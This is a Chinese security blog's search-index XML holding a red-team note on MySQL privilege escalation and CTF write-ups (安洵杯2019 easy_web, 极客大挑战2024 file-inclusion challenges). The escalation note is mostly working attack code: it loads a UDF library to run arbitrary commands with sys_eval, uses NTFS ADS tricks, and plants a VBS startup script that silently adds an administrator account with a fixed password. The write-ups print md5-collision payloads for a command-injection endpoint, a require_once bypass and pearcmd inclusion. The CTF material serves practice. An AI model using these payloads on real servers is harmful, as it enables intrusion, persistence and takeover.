<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MySQL提权</title>
    <link href="/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/"/>
    <url>/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/</url>
    
    <content type="html"><![CDATA[<h3 id="UDF提权（常用）"><a href="#UDF提权（常用）" class="headerlink" title="UDF提权（常用）"></a>UDF提权（常用）</h3><ul><li><p>概念：</p><p>在 MySQL 里，UDF 指的是用户定义函数（User-Defined Function）。它允许你根据自身需求创建自定义函数，扩展 MySQL 原本的功能。</p></li><li><p>用途：</p><p>在拿下一个网站的webshell以后发现权限很低，使用其他方式还是不能提权，如果发现本地使用了mysql数据库并且权限是root权限，就可以新建管理员用户使用udf提权</p></li><li><p>条件：</p><p>要获取一个mysql的root权限的账号，拥有将动态链接库（windows是以dll为后缀，linux是以so为后缀）写入目录的权限。</p><p>然后接下来就是要查看mysql的一些信息：</p><p>查看版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select version();<br></code></pre></td></tr></table></figure><p>查看secure-file-priv是否有写入文件的权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show global variables like &quot;secure%&quot;;<br></code></pre></td></tr></table></figure><ul><li>当secure_file_priv 的值为 NULL ，表示限制mysqld 不允许导入|导出，无法进行提权</li><li>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</li><li>当 secure_file_priv的值没有具体值时，表示不对 mysqld 的导入|导出做限制，可以提权</li></ul><p>查看plugin目录（将动态链接写入的地方）是否存在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select @@plugin_dir;<br>#或<br>show variables like &#x27;plugin%&#x27;;<br></code></pre></td></tr></table></figure><p>由于不同版本的mysql数据库对于上传的动态链接库的位置不同所以第一步就要看mysql的版本</p><table><thead><tr><th align="left">版本</th><th align="left">路径</th></tr></thead><tbody><tr><td align="left">MySQL &lt; 5.0</td><td align="left">导出路径随意</td></tr><tr><td align="left">5.0 &lt;&#x3D; MySQL &lt; 5.1</td><td align="left">需要导出至目标服务器的系统目录（如：C:\windows\system32\）</td></tr><tr><td align="left">5.1 &lt; MySQL</td><td align="left">必须导出到MySQL安装目录下的<code>lib\plugin</code>目录下（高版本mysql默认不存在<code>lib\plugin</code>目录，需要自己创建）</td></tr></tbody></table><p>由于mysql版本大于5.1，plugin文件夹默认不存在，需要创建。而这里就会面临一个问题，我只是登录上了mysql那么我怎么创建    plugin这个目录了？看文章可以使用NTFS 创建</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">select</span> @<span class="hljs-variable">@basedir</span>;<br><span class="hljs-comment">#查找到mysql的目录</span><br> <br><span class="hljs-attribute">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> into dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::<span class="hljs-variable">$INDEX_ALLOCATION</span>&#x27;</span>;<br><span class="hljs-comment">#利用NTFS ADS创建lib目录</span><br> <br><span class="hljs-attribute">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> into dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::<span class="hljs-variable">$INDEX_ALLOCATION</span>&#x27;</span>;<br><span class="hljs-comment">#利用NTFS ADS创建plugin目录</span><br></code></pre></td></tr></table></figure><p>其实还有一种，前提是获取网站权限并且有创建文件的权限（可以直接创建lib\plugin目录）</p></li><li><p>UDF文件的获取</p><p>可以通过sqlmap和msf中获取</p><p>sqlmap：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#win<br>python  E:\Tools\sqlmap-master\extra\cloak\cloak.py -d -i E:\Tools\sqlmap-master\data\udf\mysql\windows\<span class="hljs-number">64</span>\lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll<br>#kali<br>python  /usr/share/sqlmap/extra/cloak/cloak.py -d -i  /usr/share/sqlmap/data/udf/mysql/linux/<span class="hljs-number">64</span>/lib_mysqludf_sys.so_  -o lib_mysqludf_sys.so<br></code></pre></td></tr></table></figure><p>msf：<br>可以直接在&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql目录下将文件cp出来</p><img src="/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/image-20250326202610101.png" class title="image-20250326202610101"><p>msf中的exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload模块也可以进行UDF提权，由于msf我不是很会使用，所以使用的话看这篇<a href="https://blog.csdn.net/qq_45300786/article/details/117202412">文章</a></p></li><li><p>得到UDF文件后：</p><p>需要将文件上传到目标服务器上可以使用wget，webshell，或者hex编码上传，使用hex编码上传可以看看<a href="https://www.sqlsec.com/udf/">国光师傅的文章</a></p></li><li><p>创建自定义函数：</p><ul><li><p>创建一张临时表用来存放DLL&#x2F;SO文件的十六进制内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE temp_udf(udf blob);<br></code></pre></td></tr></table></figure></li><li><p>将udf文件内容插入临时表中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#win<br>insert into temp_udf values(load_file(&#x27;E:\\Tools\\lib_mysqludf_sys.dll&#x27;));<br>or<br>#linux<br>insert into temp_udf values(load_file(&#x27;上传udf文件的位置&#x27;));<br></code></pre></td></tr></table></figure></li><li><p>导出</p><p>将临时表中的udf文件导出至对应位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#win<br>SELECT * FROM temp_udf INTO DUMPFILE &quot;E:\\Web\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugins\\udf.dll&quot;<br>or<br>#这是国光师傅的十六进制导入的方法<br>SELECT  into dumpfile &#x27;E:\\Web\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugins\\udf.dll&#x27;;<br>#linux<br>SELECT * FROM temp_udf INTO DUMPFILE &quot;/usr/lib64/mysql/plugins/udf.so&quot;;<br></code></pre></td></tr></table></figure></li><li><p>引入自定义函数：</p><p>udf常用函数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sys_eval，执行任意命令，并将输出返回。<br><br>sys_exec，执行任意命令，并将退出码返回。<br><br>sys_get，获取一个环境变量。<br><br>sys_set，创建或修改一个环境变量。<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#win<br>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;<br>#kali<br>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;<br></code></pre></td></tr></table></figure></li><li><p>可以查看是否添加成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from mysql.func;<br></code></pre></td></tr></table></figure></li><li><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select sys_eval(&#x27;whoami&#x27;);<br></code></pre></td></tr></table></figure></li><li><p>如果要卸载该函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">drop function sys_eval;<br></code></pre></td></tr></table></figure><p>练习的靶场推荐：vulnhub-Raven:2</p></li></ul></li></ul><h3 id="写文件提权"><a href="#写文件提权" class="headerlink" title="写文件提权"></a>写文件提权</h3><ul><li><p><strong>启动项提权：</strong></p><ul><li><p>概念：</p><p>当Windows的启动项可以被MySQL写入的时候可以使用MySQL将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行</p></li><li><p>条件：</p><ul><li><p>数据库权限为root权限</p></li><li><p>secure_file_priv为空</p></li><li><p>windows主机</p></li></ul></li><li><p>具体操作：</p><ul><li><p>上传脚本：</p><p>上传的位置是在C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup下，getshell之后就要查看是否能够写入文件，如果是可写可读，我们才能上传vbs，(如果数据库是root权限可以直接写入)</p></li><li><p>vbs：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> <span class="hljs-attribute">wsnetwork</span>=CreateObject(&quot;WSCRIPT.NETWORK&quot;) <br><span class="hljs-attribute">os</span>=<span class="hljs-string">&quot;WinNT://&quot;</span>&amp;wsnetwork.ComputerName <br><span class="hljs-built_in">Set</span> <span class="hljs-attribute">ob</span>=GetObject(os) <span class="hljs-string">&#x27;得到adsi接口,绑定 </span><br><span class="hljs-string">Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;) &#x27;</span>属性,admin组 <br><span class="hljs-built_in">Set</span> <span class="hljs-attribute">od</span>=ob.Create(&quot;user&quot;,&quot;yankun&quot;) <span class="hljs-string">&#x27;建立用户 </span><br><span class="hljs-string">od.SetPassword &quot;Admin!@#123&quot; &#x27;</span>设置密码 <br>od.SetInfo <span class="hljs-string">&#x27;保存 </span><br><span class="hljs-string">Set of=GetObject(os&amp;&quot;/yankun&quot;,user) &#x27;</span>得到用户 <br>oe.<span class="hljs-built_in">add</span> os&amp;<span class="hljs-string">&quot;/yankun&quot;</span> <br><span class="hljs-keyword">or</span><br><span class="hljs-built_in">set</span> <span class="hljs-attribute">wshshell</span>=createobject(&quot;wscript.shell&quot;)<br><span class="hljs-attribute">a</span>=wshshell.run(&quot;cmd.exe /c net<span class="hljs-built_in"> user </span>yankun Admin!@#123 /add<span class="hljs-string">&quot;,0)</span><br><span class="hljs-string">b=wshshell.run(&quot;</span>cmd.exe /c net localgroup administrators yankun /add<span class="hljs-string">&quot;,0)</span><br></code></pre></td></tr></table></figure><p>将该用户帐户添加到本地管理员组，赋予该用户管理员权限</p></li><li><p>写入启动项</p><p>找到可写目录后上传vbs.txt,然后连接数据库（因为是root权限），使用mysql语句将vbs.txt的内容写入到C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">load_file</span>(<span class="hljs-params"><span class="hljs-string">&quot;C:/www/vbs.txt&quot;</span></span>) <span class="hljs-keyword">into</span> dumpfile &quot;C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/yankun.bat&quot;</span>;<br></code></pre></td></tr></table></figure><p>接下来只要服务器重启，即可提权成功</p></li></ul></li></ul></li></ul><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><img src="/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/image-20250328000705999.png" class title="image-20250328000705999">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>安洵杯2019</title>
    <link href="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/"/>
    <url>/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/</url>
    
    <content type="html"><![CDATA[<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>进入题目观察到url有点信息特别是cmd和img</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301021518301.png" class title="image-20250301021518301"><p>尝试cmd&#x3D;ls发现被禁止了说明Index.php中有waf禁止了一些参数，具体只有看到index.php源码才能进一步判断</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301021703936.png" class title="image-20250301021703936"><p>接下来就看到了img这个参数看起来有点想是base64编码后的</p><p>当时看到有这个（红色标记的地方）我就一直点没想到后头就真有东西出来</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301022115433.png" class title="image-20250301022115433"><p>最后的结果就是555.png，唉当时看到555.png还是没什么思路，当时不晓得为什么还想将444.png和333.png重新按照555.png编码</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301022207228.png" class title="image-20250301022207228"><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301022454088.png" class title="image-20250301022454088"><p>结果是没有任何反应，当时就卡住了没有一点思路，后面看到wp才晓得这个时候应该是编码index.php而不是你胡想的参数（现在想来也是，没源码你这个题你根本就做不了，所以一切都要围绕看到index.php的源码前提下）</p><p>观察到有base64，估计index.php的内容经过base64编码了（其实当时，我访问了555.png并且将图片下载了本地然后base64编码了一次就和img src&#x3D;’data’:images&#x2F;gif;base,内容太多了就不沾了，一样了）</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301023113411.png" class title="image-20250301023113411"><p>简单的代码审计主要考点是md5强比较绕过之前做过basectf2024也是考到一样的点，没想到这2019出的题对2024都还有帮助，可见这题是多么的经典。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>没啥好说的直接用工具fastcoll。工具的使用fastcoll.exe -o a a1，生成的两个文件a，a1就是两个不同文件但md5后是相同的最后经过urlencode一次就行（当时我想偷懒直接在Cyber上直接编码，发现传上去的数据怎么也不对，无语😶，最后写了下代码才成功）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;a1&#x27;</span>));<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=%EE%AA%03%C7Iz%28%1F%9E%1FX%B0%F3%0C%F7L%24%E5F%E7%F7%3BV%CAO69%C6%D308%D2Z%F3%BA%04%ECh-Ek%04g%B2%A2%3B%14%1AR%7C%EBA%F2%95%24%A59%15%0Dp%13%8C%ED%C5%D7%15%E2%7F%B7%9E%AE%F3%DC%87v%3Ck%F6%AE%BDy%D5q%C5x%01%BF%0B%EC%08a%16O%C7%9D%8D%09%B0v%3FOw%3B%87%7Ef%09J%8B%D4%FD%9B%D20%21g%95%D8Cm%AE%93%B5%EC%89%3F%13%DD&amp;b=%EE%AA%03%C7Iz%28%1F%9E%1FX%B0%F3%0C%F7L%24%E5Fg%F7%3BV%CAO69%C6%D308%D2Z%F3%BA%04%ECh-Ek%04g%B2%A2%BB%14%1AR%7C%EBA%F2%95%24%A59%15%0D%F0%13%8C%ED%C5%D7%15%E2%7F%B7%9E%AE%F3%DC%87v%3Ck%F6%AE%BDy%D5qEx%01%BF%0B%EC%08a%16O%C7%9D%8D%09%B0v%3FOw%3B%87%7Ef%09J%8BT%FD%9B%D20%21g%95%D8Cm%AE%93%B5l%89%3F%13%DD<br></code></pre></td></tr></table></figure><p>最后一个过滤了很多就是没过滤dir和要用cat的话反斜杠绕过（\）即可</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301024747849.png" class title="image-20250301024747849"><p>最后简单总结下：题目虽然不是很难，对我来说唯一难点就是找index.php的源码其他没啥over</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战2024</title>
    <link href="/blog/2025/02/04/CTF/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982024/wp/"/>
    <url>/blog/2025/02/04/CTF/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982024/wp/</url>
    
    <content type="html"><![CDATA[<h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez include"></a>ez include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;starven_secret.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;还想非预期?&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="需要绕过require-once："><a href="#需要绕过require-once：" class="headerlink" title="需要绕过require_once："></a>需要绕过require_once：</h4><p>php的文件包含机制是将<strong>已经包含的文件与文件的真实路径放进哈希表中</strong>，当已经require_once(‘starven_secret.php’)，已经include的文件不可以再require_once。这里需要绕过require_once，<strong>让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</strong></p><p>知识点：&#x2F;proc&#x2F;self指向当前进程的&#x2F;proc&#x2F;pid&#x2F;，&#x2F;proc&#x2F;self&#x2F;root&#x2F;是指向&#x2F;的符号链接，require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含，想到这里，用伪协议配合多级符号链接的办法进行绕过。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</span><br></code></pre></td></tr></table></figure><p>第二关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span> [<span class="hljs-string">&quot;syc&quot;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span> [<span class="hljs-string">&quot;syc&quot;</span>];<br>    <span class="hljs-variable">$hint</span> = <span class="hljs-string">&quot;register_argc_argv = On&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hint都给的这么明显了还不会做?&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], -<span class="hljs-number">4</span>) === <span class="hljs-string">&#x27;.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="利用pearcmd-php文件包含"><a href="#利用pearcmd-php文件包含" class="headerlink" title="利用pearcmd.php文件包含"></a>利用pearcmd.php文件包含</h4><p><code>register_argc_argv</code> 开启的情况下，url中?后面的内容都会传入$_SERVER[‘argv’]这个变量里，并且&amp;是无法分割参数的，真正能有效分割参数的是+号。</p><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装。不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php。</p><img src="/blog/2025/02/04/CTF/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982024/wp/image-20250204200400997.png" class title="image-20250204200400997"><p>我们使用的是config-create命令，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Flask内存🐎</title>
    <link href="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
